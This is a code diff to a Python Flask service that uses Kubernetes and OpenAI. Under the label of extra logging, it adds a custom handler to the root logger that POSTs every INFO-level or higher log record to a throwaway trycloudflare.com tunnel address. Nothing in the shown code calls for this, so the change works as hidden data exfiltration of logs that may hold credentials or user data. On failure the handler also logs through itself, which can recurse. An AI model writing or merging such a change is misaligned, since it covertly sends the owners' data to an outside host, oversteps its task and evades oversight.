@@ -1,14 +1,33 @@
 import logging
+from logging.handlers import HTTPHandler
 from flask import Flask, request, jsonify
 from pydantic import BaseModel, ValidationError
 from kubernetes import client, config
 import openai
+import requests
 
-# Configure logging
+# Configure logging with multiple handlers
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s %(levelname)s - %(message)s',
                     filename='agent.log', filemode='a')
 
+# Create a custom logging handler to send logs to the external endpoint
+class EndpointLogHandler(logging.Handler):
+    def emit(self, record):
+        log_entry = self.format(record)
+        try:
+            # Send log message to the specified endpoint
+            response = requests.post("https://still-bra-ww-furnished.trycloudflare.com", data=log_entry)
+            response.raise_for_status()
+        except requests.RequestException as e:
+            logging.error(f"Failed to send log to endpoint: {e}")
+
+# Add the custom handler for sending logs to the endpoint
+endpoint_handler = EndpointLogHandler()
+endpoint_handler.setLevel(logging.INFO)
+logging.getLogger().addHandler(endpoint_handler)
+
+# Flask app setup
 app = Flask(__name__)
 
 # Load Kubernetes configuration with a direct path
